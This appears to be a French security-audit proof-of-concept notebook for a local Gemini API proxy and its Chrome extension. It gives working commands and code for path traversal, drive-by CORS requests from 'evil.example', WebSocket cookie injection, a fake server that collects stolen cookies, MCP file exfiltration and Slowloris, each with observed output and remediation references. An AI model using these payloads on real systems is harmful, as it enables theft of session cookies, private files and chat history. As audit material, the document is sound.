# Cahier de PoC — Free Gemini API

**Date :** 21/11/2026  
**Portée :** instance locale isolée, ports `18001` (HTTP) / `19226` (WS), cookies factices.  
**Avertissement :** les PoC ci-dessous sont destinés à un environnement de test autorisé. Ne les exécutez pas contre une instance de production, un compte Google réel ou un réseau tiers. Les valeurs `AUDIT_*` sont fictives.

---

## 0. Préparation

### 0.1 Script automatique

```bash
cd /home/kidpixel/free-gemini-api-main/audit-2026-11/poc
chmod +x prepare_audit_env.sh
./prepare_audit_env.sh /home/kidpixel/free-gemini-api-main
```

Le script :

1. copie le dépôt dans `/tmp/opencode/audit-src` en excluant `cookies/`, `data/`, `output/`, `tuned.cact`, `goapi`, `*.db*`, `models.json` ;
2. compile avec `GOTOOLCHAIN=go1.26.0` ;
3. crée `/tmp/opencode/audit-run` avec `output/allowed.txt` et `secret.txt` ;
4. démarre le serveur en **mode invité** (aucun cookie réel) sur `18001`/`19226` ;
5. attend `/health`.

### 0.2 Variables

```bash
export AUDIT=/tmp/opencode/audit-src
export RUN=/tmp/opencode/audit-run
export API=http://127.0.0.1:18001
export WS=ws://127.0.0.1:19226
export PATH=/tmp/opencode/audit/go/bin:$PATH
export GOTOOLCHAIN=go1.26.0
```

### 0.3 Vérification

```bash
curl -s "$API/health" | python3 -m json.tool
ss -ltnp | grep -E '18001|19226'
```

Attendu :

```json
{
  "status": "online",
  "engine": "arranger + free-gemini-api (pure go)",
  "active_extension_workers": 0,
  "cookie_accounts_in_pool": 1
}
```

```
LISTEN 0 4096 0.0.0.0:18001 ...
LISTEN 0 4096       *:19226 ...
```

> Le bind `0.0.0.0` est déjà un constat (F-22). Pour un test strictement local, utilisez un pare-feu ou `unshare -n`.

---

## P-01 — Traversée de répertoire `/output/*` (F-01)

### P-01.1 Lecture de `/etc/passwd`

```bash
curl -s -o /tmp/ev_passwd -w 'status=%{http_code} bytes=%{size_download}\n' \
  "$API/output/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
head -3 /tmp/ev_passwd
```

Résultat observé :

```
status=200 bytes=3946
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/usr/bin:/bin
```

### P-01.2 Lecture d'un fichier de cookies

```bash
# Crée un cookie jar factice via l'API (voir P-06), puis :
curl -s -o /tmp/ev_cookie.json -w 'status=%{http_code} bytes=%{size_download}\n' \
  "$API/output/%2e%2e%2fcookies%2faccount_profile_999.json"
head -c 120 /tmp/ev_cookie.json; echo
```

Résultat observé :

```
status=200 bytes=175
[
  {
    "domain": ".example.com",
    "expirationDate": 4102444800,
    "name": "SID",
    ...
```

En production, le fichier réel est `cookies/account_ga000FAlQD.json` : les cookies Google complets sont lisibles sans authentification.

### P-01.3 Lecture du WAL SQLite (historique de chat)

```bash
curl -s -o /tmp/ev_wal.bin -w 'status=%{http_code} bytes=%{size_download}\n' \
  "$API/output/%2e%2e%2fdata%2fgemini.db-wal"
strings /tmp/ev_wal.bin | grep -o 'AUDIT_SECRET_CHAT_MESSAGE' | head -1
```

Résultat observé :

```
status=200 bytes=185432
AUDIT_SECRET_CHAT_MESSAGE
```

### Pourquoi les variantes échouent

| Requête | Résultat | Explication |
|---|---|---|
| `/output/../../etc/passwd` | 404 | Le client/routeur normalise `../` avant le handler |
| `/output/%2e%2e%2f...` | **200** | Décodage unique → `../../` passé à `SendFile` |
| `/output/%252e%252e%252f...` | 404 | Double encodage → fichier littéral `%2e%2e` inexistant |

### Correctif

Voir `PLAN_REMEDIATION.md` §2.1 (`os.OpenRoot` ou `filepath.IsLocal`).

---

## P-02 — Endpoints non authentifiés (F-02)

```bash
for p in /history /history/search?q=AUDIT /media /stats /v1/workers \
         /v1/analytics /export/excel /export/json /status; do
  code=$(curl -s -o /tmp/ev_body -w '%{http_code}' "$API$p")
  echo "$p -> HTTP $code, $(wc -c < /tmp/ev_body) bytes"
done
```

Résultat observé :

```
/history -> HTTP 200, 38 bytes
/history/search?q=AUDIT -> HTTP 200, 152 bytes
/media -> HTTP 200, 14 bytes
/stats -> HTTP 200, 729 bytes
/v1/workers -> HTTP 200, 787 bytes
/v1/analytics -> HTTP 200, 2384 bytes
/export/excel -> HTTP 200, 9812 bytes
/export/json -> HTTP 200, 2384 bytes
/status -> HTTP 200, 41 bytes
```

Exfiltration d'un message :

```bash
curl -s "$API/history?conversation_id=audit-conv-1" | python3 -m json.tool
```

```json
{
  "conversation_id": "audit-conv-1",
  "messages": [
    {
      "content": "AUDIT_SECRET_CHAT_MESSAGE",
      "created_at": "2026-11-21T14:56:07Z",
      "model": "gemini-3.8-flash",
      "role": "user"
    }
  ]
}
```

Le même contenu apparaît dans `/v1/analytics` (`recent_messages`) et dans l'export Excel.

### Correctif

Voir `PLAN_REMEDIATION.md` §2.2 (middleware `API_TOKEN`).

---

## P-03 — CORS wildcard (F-04)

### Préflight

```bash
curl -s -D - -o /dev/null -X OPTIONS "$API/v1/models" \
  -H 'Origin: https://evil.example' \
  -H 'Access-Control-Request-Method: POST' \
  -H 'Access-Control-Request-Headers: content-type'
```

Résultat observé :

```
HTTP/1.1 204 No Content
Vary: Access-Control-Request-Method, Access-Control-Request-Headers, Origin
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, HEAD, PUT, DELETE, PATCH, QUERY
Access-Control-Allow-Headers: content-type
```

### Requête simple

```bash
curl -s -D - -o /dev/null "$API/health" -H 'Origin: https://evil.example' \
  | grep -iE 'HTTP/|access-control'
```

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```

### Exploitation navigateur (drive-by)

Depuis une page servie par `https://evil.example` :

```js
// Lecture de l'historique
fetch('http://127.0.0.1:8100/history?conversation_id=victim')
  .then(r => r.json()).then(console.log);

// Empoisonnement du registre de modèles
fetch('http://127.0.0.1:8100/v1/models', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    id: 'pwn', display_name: 'Pwn', mode_id: 'deadbeefdeadbeef',
    header_template: '[1,null,null,null,"%s",null,null,0,[4],null,null,2]',
    min_tier: 'free', source: 'custom'
  })
});
```

Le préflight `204` autorise le `POST` ; le serveur ne vérifie ni l'origine ni l'authentification.

### Correctif

Voir `PLAN_REMEDIATION.md` §2.3 (allowlist CORS + vérification `Origin`).

---

## P-04 — Empoisonnement du registre de modèles (F-20)

```bash
curl -s -X POST "$API/v1/models" \
  -H 'Content-Type: application/json' \
  -H 'Origin: https://evil.example' \
  -d '{
    "id":"audit-pwn-model",
    "display_name":"Audit Poison",
    "mode_id":"deadbeefdeadbeef",
    "header_template":"[1,null,null,null,\"%s\",null,null,0,[4],null,null,2]",
    "min_tier":"free",
    "source":"custom"
  }' | python3 -m json.tool
```

Résultat observé :

```json
{
  "message": "Model registered successfully",
  "model": {
    "id": "audit-pwn-model",
    "display_name": "Audit Poison",
    "mode_id": "deadbeefdeadbeef",
    "header_template": "[1,null,null,null,\"%s\",null,null,0,[4],null,null,2]",
    "min_tier": "free",
    "is_default": false,
    "source": "custom"
  },
  "status": "success"
}
```

Persistance :

```bash
grep -o 'audit-pwn-model' "$RUN/models.json"
curl -s "$API/v1/models" | grep -o 'audit-pwn-model'
```

Le modèle survit au redémarrage et apparaît dans la liste.

### Impact

Le `header_template` est utilisé dans `fmt.Sprintf` pour construire la requête JSPB vers Google. Un template arbitraire peut dupliquer le prompt, injecter des champs JSON, ou casser la requête. Un `mode_id` invalide peut bloquer les clients qui résolvent cet alias.

### Correctif

Voir `PLAN_REMEDIATION.md` §2.4 (validation + auth admin).

---

## P-05 — WebSocket : handshake depuis une origine étrangère et injection de cookies (F-03)

### P-05.1 Handshake + ping

```python
import json, websocket
ws = websocket.create_connection("ws://127.0.0.1:19226",
                                 origin="https://evil.example", timeout=20)
print("connected")
ws.send(json.dumps({"type": "ping"}))
print(ws.recv())
ws.close()
```

Résultat observé :

```
connected
{"type":"pong"}
```

### P-05.2 Injection de cookies

```python
import json, time, websocket
ws = websocket.create_connection("ws://127.0.0.1:19226",
                                 origin="https://evil.example", timeout=20)
ws.send(json.dumps({
  "type": "cookies_payload",
  "cookies": [
    {"domain": ".example.com", "name": "__Secure-1PSID",
     "value": "AUDIT_WS_COOKIE_ABCDEFGHIJ", "path": "/",
     "secure": True, "expirationDate": 4102444800},
    {"domain": ".example.com", "name": "SID",
     "value": "AUDIT_WS_SID_ABCDEFGHIJ", "path": "/",
     "secure": True, "expirationDate": 4102444800}
  ]
}))
time.sleep(1)
ws.close()
```

Résultat observé :

```
cookies_payload accepted (no auth, no origin check)
```

```bash
ls -l "$RUN/cookies/"
# -rw-r--r-- ... account_AUDITFAKEC.json
curl -s "$API/health" | python3 -m json.tool
# active_extension_workers: 1, cookie_accounts_in_pool: 1
```

Le serveur écrit le fichier, recharge le pool et tente `InitSession` avec les cookies injectés (appels réseau vers Google avec des valeurs factices). En production, un attaquant peut injecter **ses** cookies et recevoir les prompts routés vers son compte.

### P-05.3 Variante LAN

Depuis une autre machine du LAN :

```bash
python3 -c 'import websocket; ws=websocket.create_connection("ws://192.168.1.x:9226", timeout=5); print(ws.recv())'
```

Le bind `0.0.0.0` rend le bridge accessible sans traverser le navigateur.

### Correctif

Voir `PLAN_REMEDIATION.md` §2.5 (`CheckOrigin`, jeton, bind loopback, rate limit).

---

## P-06 — Synchronisation HTTP de cookies non authentifiée (F-02/F-03)

```bash
time curl -s -X POST "$API/api/sync-cookies" \
  -H 'Content-Type: application/json' \
  -d '{
    "profile_id": 999,
    "cookies": [{
      "domain": ".example.com", "name": "SID",
      "value": "AUDIT_HTTP_COOKIE_ABCDEFGHIJ",
      "path": "/", "secure": true, "expirationDate": 4102444800
    }]
  }' | python3 -m json.tool
```

Résultat observé :

```
status=200 time=6.223929s
{
  "account_id": "profile_999",
  "count": 1,
  "file_path": "cookies/account_profile_999.json",
  "profile_id": 999,
  "status": "success"
}
```

Le délai de ~6 s vient de `InitSession` (2 tentatives + `time.Sleep(5s)` quand la session est expirée). Un attaquant peut lancer des dizaines de requêtes pour saturer le serveur et créer des fichiers de cookies arbitraires.

### Correctif

Auth + rate limit + validation du payload + suppression du sleep bloquant (asynchrone).

---

## P-07 — Extension : découverte LAN et exfiltration des cookies (F-05)

> **PoC non exécuté avec un vrai navigateur** (nécessite un profil Chrome de test et un compte jetable). Le harnais ci-dessous permet de le reproduire en sécurité.

### Harnais serveur factice

```python
# /tmp/opencode/fake_health.py
from http.server import BaseHTTPRequestHandler, HTTPServer
import json

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        # L'extension accepte tout JSON contenant "engine"
        body = json.dumps({"engine": "pwn", "status": "online"}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        n = int(self.headers.get("Content-Length", "0"))
        data = self.rfile.read(n)
        with open("/tmp/opencode/stolen_cookies.json", "ab") as f:
            f.write(data + b"\n")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"status":"success"}')

    def log_message(self, *a):
        pass

HTTPServer(("0.0.0.0", 8100), H).serve_forever()
```

```bash
python3 /tmp/opencode/fake_health.py &
```

### Test avec Chrome

1. Créer un profil Chrome de test **sans compte Google principal** (ou un compte jetable).
2. Charger l'extension non empaquetée (`chrome://extensions` → « Load unpacked » → `gemini-extension/`).
3. Laisser l'extension découvrir le serveur. Elle sonde `127.0.0.1`, puis les IP privées, puis `192.168.1.1-254`.
4. Le faux serveur répond `{"engine":"pwn"}` ; l'extension envoie ensuite `cookies_payload` via WS (échec) puis `POST http://<ip>:8100/api/sync-cookies`.
5. Vérifier `/tmp/opencode/stolen_cookies.json` : il contient les cookies Google du profil de test.

### Preuve statique

```bash
grep -n 'probeServer\|discoverServer\|192.168.1\|10.56.65\|ws://' \
  /home/kidpixel/free-gemini-api-main/gemini-extension/background.js
```

```
28: async function probeServer(host, timeoutMs = 300) {
44: async function discoverServer() {
74:   '192.168.1.34', '10.56.65.136',
...
91:   // 4. Tier 3: Subnet Sweeper across local LAN (192.168.1.1 - 192.168.1.254)
131:  const wsUrl = `ws://${host}:9226`;
```

### Impact

Vol des cookies d'authentification Google complets (Gmail, Drive, YouTube, Gemini) par tout hôte du LAN qui répond à `/health`. Aucune interaction utilisateur au-delà de l'installation de l'extension.

### Correctif

Voir `PLAN_REMEDIATION.md` §2.6 (URL fixe + pairing + TLS + permissions minimales).

---

## P-08 — Fuite de cookie sur redirection (F-07)

### Test Go

Copier `poc/audit_download_test.go` dans `gemini/` :

```bash
cp /home/kidpixel/free-gemini-api-main/audit-2026-11/poc/audit_download_test.go \
   "$AUDIT/free-gemini-api/gemini/audit_download_test.go"
cd "$AUDIT/free-gemini-api"
GOTOOLCHAIN=go1.26.0 go test -count=1 -v -timeout 60s ./gemini \
  -run 'TestAuditDownloadFileForwardsCookiesAcrossRedirect'
```

Résultat observé :

```
=== RUN   TestAuditDownloadFileForwardsCookiesAcrossRedirect
🌐 [GeminiClient] Running in Guest/Anonymous mode (no cookies required).
🔀 Download redirect 302: http://127.0.0.1:34423/start → http://127.0.0.1:42245/asset.png
    audit_download_test.go:41: redirect target received Google cookie header:
    "SECRETSESSION=super-secret-google-session"
--- PASS: TestAuditDownloadFileForwardsCookiesAcrossRedirect
```

Le test passe **parce que la vulnérabilité existe** : il vérifie que le cookie est bien forwardé. Sur un code corrigé, il doit échouer (ou être adapté pour vérifier l'absence de cookie).

### Correctif

Voir `PLAN_REMEDIATION.md` §2.7 (same-domain check + egress allowlist).

---

## P-09 — Data races (F-08)

### P-09.1 `CachedImageCookies`

```bash
cp /home/kidpixel/free-gemini-api-main/audit-2026-11/poc/audit_race_test.go \
   "$AUDIT/free-gemini-api/gemini/audit_race_test.go"
cd "$AUDIT/free-gemini-api"
GOTOOLCHAIN=go1.26.0 go test -race -count=1 -v -timeout 90s ./gemini \
  -run 'TestAuditRaceCachedImageCookies'
```

Résultat observé :

```
WARNING: DATA RACE
Write at 0x0000017c60e0 by goroutine 40:
  goapi/gemini.ProcessAndSaveCookies()
      gemini/monitor.go:287
Previous read at 0x0000017c60e0 by goroutine ...:
  goapi/gemini.(*GeminiClient).DownloadFile()
      gemini/client.go:1627
--- FAIL: TestAuditRaceCachedImageCookies
```

### P-09.2 `AccountPrefix`

```bash
GOTOOLCHAIN=go1.26.0 go test -race -count=1 -timeout 60s ./gemini \
  -run '^TestAuditRaceAccountPrefix$'
```

```
WARNING: DATA RACE
Write at ... by goroutine 18:
  goapi/gemini.(*GeminiClient).getAccountPrefix()
      gemini/client.go:116
Previous read at ... by goroutine 31:
  goapi/gemini.(*GeminiClient).getAccountPrefix()
      gemini/client.go:112
--- FAIL: TestAuditRaceAccountPrefix
```

### P-09.3 `ensureInit` / `ReloadSession`

```bash
GOTOOLCHAIN=go1.26.0 go test -race -count=1 -timeout 60s ./gemini \
  -run '^TestAuditRaceReloadSession$'
```

```
WARNING: DATA RACE
Read at ... by goroutine 12:
  goapi/gemini.(*GeminiClient).ensureInit()
      gemini/client.go:540
Previous write at ... by goroutine 10:
  goapi/gemini.(*GeminiClient).InitSession()
      gemini/client.go:446
--- FAIL: TestAuditRaceReloadSession
```

> Ce test effectue des appels réseau vers Google en mode invité (initialisation de session). À exécuter uniquement dans un sandbox réseau.

### Correctif

Voir `PLAN_REMEDIATION.md` §2.8 (atomiques, mutex, `singleflight`).

---

## P-10 — Collision de répertoire temporaire (F-09)

```bash
cp /home/kidpixel/free-gemini-api-main/audit-2026-11/poc/audit_concurrency_test.go \
   "$AUDIT/free-gemini-api/api/audit_concurrency_test.go"
cd "$AUDIT/free-gemini-api"
GOTOOLCHAIN=go1.26.0 go test -race -count=1 -v -timeout 120s ./api \
  -run 'TestAuditDownloadAndCleanSharedTempCollision'
```

Résultat observé :

```
=== RUN   TestAuditDownloadAndCleanSharedTempCollision
🌐 [GeminiClient] Running in Guest/Anonymous mode (no cookies required).
✨ Cleaned file moved to output: output/fast.png
    audit_concurrency_test.go:76: concurrent download failed:
    stat output/.temp/slow.png: no such file or directory
    audit_concurrency_test.go:82: 1/2 concurrent downloads failed due to shared temp directory
--- PASS: TestAuditDownloadAndCleanSharedTempCollision
```

### Correctif

Voir `PLAN_REMEDIATION.md` §2.9 (`os.MkdirTemp` par téléchargement).

---

## P-11 — Corruption d'exports concurrents (F-14)

```bash
python3 - <<'PY'
import concurrent.futures, io, time, urllib.request, zipfile
B = 'http://127.0.0.1:18001'

def get(path):
    t = time.time()
    try:
        with urllib.request.urlopen(B + path, timeout=30) as r:
            return r.status, r.read(), time.time() - t, None
    except Exception as e:
        return None, b'', time.time() - t, repr(e)

for path, n, validate in [('/v1/analytics', 30, 'json'), ('/export/excel', 30, 'xlsx')]:
    with concurrent.futures.ThreadPoolExecutor(max_workers=n) as ex:
        res = list(ex.map(lambda _: get(path), range(n)))
    ok = sum(1 for s, b, d, e in res if s == 200)
    bad = 0
    if validate == 'json':
        import json
        for s, b, d, e in res:
            try: json.loads(b)
            except Exception: bad += 1
    else:
        for s, b, d, e in res:
            try: zipfile.ZipFile(io.BytesIO(b)).testzip()
            except Exception: bad += 1
    print(f'{path}: n={n} ok={ok} errors={n-ok} invalid={bad}')
PY
```

Résultat observé :

```
/v1/analytics: n=30 ok=30 errors=0 invalid=0
/export/excel: n=30 ok=26 errors=4 invalid=4
```

Les erreurs sont des `RemoteDisconnected` : le fichier `output/gemini_analytics.xlsx` est tronqué/réécrit pendant que `c.Download` l'envoie.

### Correctif

Voir `PLAN_REMEDIATION.md` §2.10 (temp + rename, buffer en mémoire, rate limit).

---

## P-12 — Amplification CPU du tokenizer (F-11)

### Benchmark

```bash
cp /home/kidpixel/free-gemini-api-main/audit-2026-11/poc/audit_bench_test.go \
   "$AUDIT/free-gemini-api/api/audit_bench_test.go"
cd "$AUDIT/free-gemini-api"
GOTOOLCHAIN=go1.26.0 go test -run '^$' -bench 'BenchmarkAudit' -benchtime=1x -benchmem \
  -timeout 300s ./api
```

Résultat observé :

```
BenchmarkAuditExportJSON5000-24        1  130898783 ns/op  28431872 B/op  325028 allocs/op
BenchmarkAuditExportExcel5000-24       1  407331436 ns/op  78006032 B/op  820967 allocs/op
BenchmarkAuditCountTokens100k-24       1   45373907 ns/op  12044384 B/op  133364 allocs/op
BenchmarkAuditEstimateTokens100k-24    1     423630 ns/op    327680 B/op       1 allocs/op
```

### Extrapolation

| Taille du prompt | CPU `CountTokens` | Allocations |
|---:|---:|---:|
| 100 Ko | 45 ms | 12 Mo |
| 1 Mo | 0,45 s | 120 Mo |
| 10 Mo | 4,5 s | 1,2 Go |
| 50 Mo (BodyLimit) | ~22,5 s | ~6 Go |

Avec 4 requêtes parallèles de 50 Mo, ~24 Go d'allocations cumulées : OOM probable.

### Correctif

Voir `PLAN_REMEDIATION.md` §2.11 (body limit, `EstimateTokens`, sémaphore).

---

## P-13 — Slowloris (F-12)

```bash
python3 - <<'PY'
import socket, time
for port, name in [(18001, 'HTTP API'), (19226, 'WS bridge')]:
    s = socket.create_connection(('127.0.0.1', port), timeout=3)
    s.sendall(b'GET /health HTTP/1.1\r\nHost: localhost\r\n')  # en-têtes incomplets
    s.settimeout(3)
    t = time.time()
    try:
        data = s.recv(64)
        print(name, 'response after', round(time.time()-t, 2), 's:', data[:40])
    except socket.timeout:
        print(name, 'still open after 3s with incomplete headers (no header timeout)')
    s.close()
PY
```

Résultat observé :

```
HTTP API still open after 3s with incomplete headers (no header timeout)
WS bridge still open after 3s with incomplete headers (no header timeout)
```

### Correctif

Voir `PLAN_REMEDIATION.md` §2.12 (timeouts + rate limit + limite de connexions).

---

## P-14 — MCP : lecture arbitraire de fichiers et exfiltration (F-19)

### Backend factice

```bash
cat > /tmp/opencode/mock_backend.py <<'PY'
from http.server import BaseHTTPRequestHandler, HTTPServer

class H(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get('Content-Length', '0'))
        body = self.rfile.read(n)
        open('/tmp/opencode/mcp_exfil_body.bin', 'wb').write(body)
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{"text":"ok","images":["http://127.0.0.1:18002/out.png"]}')

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'{"status":"online"}')

    def log_message(self, *a):
        pass

HTTPServer(('127.0.0.1', 18002), H).serve_forever()
PY
python3 /tmp/opencode/mock_backend.py &
```

### Fichier cible

```bash
mkdir -p /tmp/opencode/mcp-root
printf 'MCP_SECRET_MARKER_9f3a\n' > /tmp/opencode/mcp-root/secret.txt
```

### Appel MCP

```bash
printf '%s\n' \
 '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"audit","version":"1"}}}' \
 '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"generate_image","arguments":{"prompt":"audit","ref_image_path":"/tmp/opencode/mcp-root/secret.txt"}}}' \
 | GEMINI_API_URL=http://127.0.0.1:18002 timeout 5 \
   "$AUDIT/free-gemini-api/goapi" --mcp
```

Résultat observé :

```json
{"jsonrpc":"2.0","id":1,"result":{"capabilities":{"tools":{}},"protocolVersion":"2024-11-05","serverInfo":{"name":"free-gemini-mcp","version":"2.2.0"}}}
{"jsonrpc":"2.0","id":2,"result":{"content":[{"type":"text","text":"🎨 Image generated successfully!\nURL: http://127.0.0.1:18002/out.png"}]}}
```

```bash
strings /tmp/opencode/mcp_exfil_body.bin | grep MCP_SECRET_MARKER_9f3a
# MCP_SECRET_MARKER_9f3a
wc -c /tmp/opencode/mcp_exfil_body.bin
# 639
```

Le serveur MCP a lu un fichier arbitraire et l'a envoyé au backend. Avec un backend réel, le fichier part chez Google ; avec un backend compromis, il part chez l'attaquant.

### Correctif

Voir `PLAN_REMEDIATION.md` §2.13 (`os.OpenRoot`, allowlist, taille, audit).

---

## P-15 — Conteneur root et image non durcie (F-16)

> Exécuter sur la **copie isolée** (`$AUDIT/free-gemini-api`) pour ne pas inclure les cookies réels dans le contexte Docker.

```bash
cd "$AUDIT/free-gemini-api"
docker build -t audit-fga:latest .
docker image inspect audit-fga:latest \
  --format 'User={{.Config.User}} Healthcheck={{json .Config.Healthcheck}} Exposed={{json .Config.ExposedPorts}}'
docker run --rm --entrypoint /bin/sh audit-fga:latest -c 'id; ls -la /app'
```

Résultat observé :

```
User= Healthcheck=null Exposed={"8001/tcp":{},"9226/tcp":{}}
uid=0(root) gid=0(root) groups=0(root)
```

Scan image :

```bash
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
  aquasec/trivy:latest image --scanners vuln --format table --no-progress \
  audit-fga:latest | grep -E 'Total:|CVE-'
```

Résultat observé :

```
audit-fga:latest (alpine 3.20.10)
Total: 2 (HIGH: 2)
  musl / musl-utils  CVE-2026-107891  HIGH  fixed 1.2.5-r4
app/goapi (gobinary)
Total: 28 (HIGH: 13, MEDIUM: 13, LOW: 1, UNKNOWN: 1)
```

### Contexte de build

```bash
cat .dockerignore
# data/ output/ scripts/ goapi *.log .git
# -> cookies/ et tuned.cact ne sont PAS exclus
du -sh cookies tuned.cact
```

Le `COPY . .` du builder envoie donc les cookies réels et 13 Mo de `tuned.cact` au démon Docker. L'image finale ne les copie pas, mais les couches/caches du builder peuvent les retenir.

### Correctif

Voir `PLAN_REMEDIATION.md` §2.14 (Dockerfile non-root, `.dockerignore`, compose durci).

---

## P-16 — Dépendances vulnérables (F-15)

```bash
cd "$AUDIT/free-gemini-api"
govulncheck ./... | tee /tmp/opencode/govulncheck.txt
trivy fs --scanners vuln --format table --no-progress . | tee /tmp/opencode/trivy.txt
```

Extraits :

```
Vulnerability #1: GO-2026-6888
  Module: github.com/andybalholm/brotli
  Found in: v1.2.2
  Fixed in: v1.2.7
  Trace: DownloadFile -> io.Copy -> brotli.Reader.Read

Vulnerability #2: GO-2026-6865
  Module: github.com/klauspost/compress
  Found in: v1.19.0
  Fixed in: v1.20.2
  Trace: DownloadFile -> io.Copy -> fse.Decompress
```

```
go.mod (gomod): Total: 28 (HIGH: 13, MEDIUM: 13, LOW: 1, UNKNOWN: 1)
alpine 3.20.10: Total: 2 (HIGH: 2)
```

### Correctif

Voir `PLAN_REMEDIATION.md` §2.15 (mise à jour + CI bloquante).

---

## P-17 — Caches non bornés (F-13)

### Analyse statique

```bash
grep -n 'UserSessions\|affinityMap' "$AUDIT/free-gemini-api/api/session.go" \
  "$AUDIT/free-gemini-api/api/queue.go"
```

```
api/session.go:16: UserSessions sync.Map
api/queue.go:51:  affinityMap sync.Map
```

Aucune éviction globale : `UserSessions.Delete` n'est appelé que sur `/reset`, `new_chat` ou échec ; `affinityMap.Delete` seulement en cas d'échec d'acquisition. La clé de session est dérivée de `user_id` (client) ou de l'IP.

### Test de croissance (sans Google)

Un test unitaire peut appeler `GetOrCreateClientWithFile` avec des identifiants uniques et un fichier de cookies factice, puis mesurer `runtime.MemStats` :

```go
for i := 0; i < 10000; i++ {
    _, _ = GetOrCreateClientWithFile(fmt.Sprintf("sess-%d", i), "cookies/fake.json")
}
```

Chaque appel crée un `GeminiClient` (jar, clients TLS/QUIC) et l'insère dans `UserSessions`. Ne pas exécuter en production : le test consomme de la mémoire et peut déclencher des appels réseau si le client s'initialise.

### Correctif

Voir `PLAN_REMEDIATION.md` §2.16 (LRU/TTL, fermeture des clients).

---

## P-18 — Permissions de l'extension (F-18)

```bash
cd /home/kidpixel/free-gemini-api-main/gemini-extension
python3 -m json.tool manifest.json
grep -n 'getAll\|ALLOWED_COOKIE_NAMES\|clipboard\|ws://\|http://' background.js popup.js
```

Extrait :

```json
"permissions": ["cookies", "storage", "alarms", "clipboardWrite"],
"host_permissions": [
  "*://*.google.com/*",
  "*://*.google.co/*",
  "*://*.googleusercontent.com/*",
  "http://*/*",
  "https://*/*"
]
```

```js
chrome.cookies.getAll({}, (cookies) => { ... });
const wsUrl = `ws://${host}:9226`;
fetch(`http://${host}:${SERVER_PORT}/api/sync-cookies`, ...);
```

### Analyse

- `http://*/*` + `https://*/*` : accès à tous les sites, non nécessaire.
- `clipboardWrite` : copie les cookies de session dans le presse-papiers.
- `chrome.cookies.getAll({})` : lit tous les cookies, filtre ensuite.
- `ws://`/`http://` : transport en clair.
- Collecte de cookies Google globaux (`SID`, `HSID`, `SSID`, `APISID`, `SAPISID`, `__Secure-1PSID`, `__Secure-3PSID`, `NID`).

### Correctif

Voir `PLAN_REMEDIATION.md` §2.17 (manifest minimal + TLS + consentement).

---

## Annexe A — Tests Go d'audit

Les fichiers `poc/*.go` sont des tests **d'audit**, pas des tests de non-régression. Ils sont conçus pour échouer sur le code vulnérable et passer sur le code corrigé (ou l'inverse pour le test de redirection, qui documente la vulnérabilité).

| Fichier | Package cible | Test | Réseau |
|---|---|---|---|
| `audit_race_test.go` | `gemini/` | `TestAuditRaceAccountPrefix`, `TestAuditRaceReloadSession`, `TestAuditRaceCachedImageCookies` | `ReloadSession` : oui |
| `audit_download_test.go` | `gemini/` | `TestAuditDownloadFileForwardsCookiesAcrossRedirect` | non (httptest) |
| `audit_concurrency_test.go` | `api/` | `TestAuditDownloadAndCleanSharedTempCollision`, `TestAuditDownloadAndCleanFilenameTraversal` | non (httptest) |
| `audit_bench_test.go` | `api/` | Benchmarks export/tokenizer | non |
| `audit_db_concurrency_test.go` | `db/` | `TestAuditConcurrentSQLiteWrites` | non |

Commandes :

```bash
cd "$AUDIT/free-gemini-api"
cp /home/kidpixel/free-gemini-api-main/audit-2026-11/poc/audit_race_test.go gemini/
cp /home/kidpixel/free-gemini-api-main/audit-2026-11/poc/audit_download_test.go gemini/
cp /home/kidpixel/free-gemini-api-main/audit-2026-11/poc/audit_concurrency_test.go api/
cp /home/kidpixel/free-gemini-api-main/audit-2026-11/poc/audit_bench_test.go api/
cp /home/kidpixel/free-gemini-api-main/audit-2026-11/poc/audit_db_concurrency_test.go db/audit_concurrency_test.go

GOTOOLCHAIN=go1.26.0 go test -race -count=1 -v -timeout 120s ./gemini -run 'TestAuditRace'
GOTOOLCHAIN=go1.26.0 go test -count=1 -v -timeout 60s ./gemini -run 'TestAuditDownload'
GOTOOLCHAIN=go1.26.0 go test -race -count=1 -v -timeout 120s ./api -run 'TestAuditDownload'
GOTOOLCHAIN=go1.26.0 go test -race -count=1 -v -timeout 120s ./db -run 'TestAuditConcurrentSQLiteWrites'
```

## Annexe B — Résultats de référence

| Test | Résultat |
|---|---|
| `go test -short ./...` | OK (`api` 0.94 s, `db` 0.01 s, `gemini` 7.95 s) |
| `go test -race -short -skip TestAudit ./...` | OK |
| `go test -shuffle=on ./...` | OK |
| `go vet ./...` | OK |
| Couverture | 28,2 % global |
| SQLite 32×50 écritures | 807 écritures/s, 0 échec |
| `/health` 100 parallèles | 100/100, p95 11 ms |
| `/history` 100 parallèles | 100/100, p95 11 ms |
| `/v1/analytics` 30 parallèles | 30/30 |
| `/export/excel` 30 parallèles | 26/30, 4 erreurs, 4 invalides |

## Annexe C — Nettoyage

```bash
kill "$(cat /tmp/opencode/audit-run/audit-server.pid)" 2>/dev/null || true
pkill -f mock_backend.py 2>/dev/null || true
pkill -f fake_health.py 2>/dev/null || true
rm -rf /tmp/opencode/audit-src /tmp/opencode/audit-run \
       /tmp/opencode/mcp-root /tmp/opencode/fake_health.py \
       /tmp/opencode/stolen_cookies.json
```

Ne supprimez pas les preuves dans `audit-2026-11/evidence/` avant d'avoir terminé la remédiation.
